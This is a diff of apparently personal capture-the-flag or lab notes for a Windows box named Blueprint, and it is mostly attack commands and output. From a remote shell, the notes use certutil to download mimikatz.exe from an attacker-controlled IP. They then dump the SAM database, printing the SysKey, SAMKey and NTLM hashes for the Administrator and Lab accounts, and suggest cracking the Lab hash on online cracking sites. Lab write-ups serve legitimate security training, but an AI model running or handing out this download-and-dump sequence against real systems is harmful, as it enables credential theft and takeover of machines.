@@ -42,12 +42,52 @@ The operation completed successfully.
 
 RCE_SHELL$ 
 
+unable to get another rev shell through this easily. and unable to get the system.b64 to type out
 
 
 
+RCE_SHELL$ certutil.exe -f -urlcache http://192.168.141.97:8000/mimikatz.exe mimi.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
 
 
 
+RCE_SHELL$ mimi.exe lsadump::sam exit > C:\Windows\Temp\mimi_sam.txt 2>&1
+
+RCE_SHELL$ type C:\Windows\Temp\mimi_sam.txt
+
+  .#####.   mimikatz 2.2.0 (x86) #19041 Sep 19 2022 17:43:26
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # lsadump::sam
+Domain : BLUEPRINT
+SysKey : 147a48de4a9815d2aa479598592b086f
+Local SID : S-1-5-21-3130159037-241736515-3168549210
+
+SAMKey : 3700ddba8f7165462130a4441ef47500
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 549a1bcb88e35dc18c7a0b0168631411
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000003e8 (1000)
+User : Lab
+  Hash NTLM: 30e87bf999828446a1c1209ddde4c450
+
+mimikatz(commandline) # exit
+Bye!
+
+RCE_SHELL$ 
+
+
+this Lab user ntlm hash can be cracked on ntlm.pw or crackstation
 
 
 
